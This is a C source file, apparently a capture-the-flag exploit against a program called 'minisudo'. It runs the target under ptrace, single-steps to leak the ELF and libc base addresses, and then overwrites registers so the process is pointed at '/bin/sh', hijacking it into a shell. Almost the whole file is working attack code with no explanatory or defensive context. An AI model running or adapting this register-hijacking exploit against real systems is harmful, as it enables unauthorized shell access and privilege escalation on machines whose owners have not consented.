#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/personality.h>
#include <sys/user.h>
#include <stdint.h>

uint64_t elf, libc;
char *const argv[] = {"./minisudo", NULL};
char *const envp[] = {NULL};
const char* bin_sh = "/bin/sh";
int main() {
    pid_t pid;
    pid = fork();
    struct user_regs_struct regs;
    if (pid == 0) {
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        execve(argv[0], argv, envp);
    }
    wait(NULL);
    int status;
    while(1) {
        ptrace(PTRACE_GETREGS, pid, 0, &regs);
        if ((regs.rip >> 44) == 5) printf("[+] %p\n", regs.rip);
        
        if ((regs.rip & 0xfff) == 0x160 && (regs.rip >> 44) == 5 ) {
            elf = regs.rip - 0x1160;
            printf("%p\n", elf);
            asm("int3");
        }
        if ((regs.rip & 0xfff) == 0x79f && (regs.rax) == 0) {
            libc = regs.rip - 0x11a79f;
            printf("%p\n", libc);
            regs.rax = 1;
            regs.rdi = bin_sh;
            regs.rsi = 0;
            regs.rdx = 0x10;
            sleep(10);
            ptrace(PTRACE_SETREGS, pid, 0, &regs);
            ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
            ptrace(PTRACE_DETACH, pid, 0, 0);
            sleep(1);
        }
        ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            puts("Exited");
            exit(0);
        }   
    }

}